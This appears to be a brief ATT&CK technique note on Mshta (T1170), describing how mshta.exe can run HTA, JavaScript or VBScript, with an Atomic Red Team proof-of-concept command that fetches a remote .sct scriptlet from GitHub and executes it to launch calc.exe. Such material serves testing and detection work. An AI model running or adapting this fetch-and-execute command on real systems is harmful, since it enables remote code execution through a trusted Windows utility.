#Mshta -- T1170

#Description

Mshta.exe is a Microsoft Utility that allows for the execution of HTML applications. An attacker can leverage mshta.exe to execute malicious .hta files and execute Javascript or VBScript using the trusted Windows Utility. Red Atomic/Canary provided a proof-of-concept for this ATT&CK Mitre Execution Technique. Here's an example command that leverages using mshta.exe to launch calc.exe

#Attack 
mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/mshta.sct')).Exec();close();

